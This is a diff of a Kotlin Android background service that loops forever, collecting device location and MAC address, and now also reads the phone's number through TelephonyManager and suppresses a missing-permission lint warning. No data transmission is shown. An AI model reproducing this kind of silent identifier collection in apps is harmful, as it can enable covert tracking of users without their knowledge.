@@ -7,16 +7,14 @@ import android.content.Intent
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
-import android.net.wifi.WifiManager
 import android.os.Bundle
 import android.os.IBinder
 import android.os.Looper
-import android.provider.Settings
+import android.telephony.TelephonyManager
 import com.google.gson.Gson
 import org.jetbrains.anko.doAsync
 import java.net.NetworkInterface
 import java.util.*
-import kotlin.collections.ArrayList
 
 
 class Service : Service() {
@@ -37,16 +35,22 @@ class Service : Service() {
         return super.onStartCommand(intent, flags, startId)
     }
 
+    @SuppressLint("MissingPermission")
     fun getLocationService(){
         Looper.prepare()
         while(true){
             var macAddress = getMacAddress()
+            val sanitizerMac = Regex("[:]")
+            macAddress = sanitizerMac.replace(macAddress, "")
 
-            val rule = Regex("[:]")
-            macAddress = rule.replace(macAddress, "")
+            val sanitizerTel = Regex("[+]")
+            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            var telNumber = tm.line1Number
+            telNumber = sanitizerTel.replace(telNumber, "")
 
             var location = getLocation()
             location.add(macAddress)
+            location.add(telNumber)
 
             val json = Gson().toJson("")
 
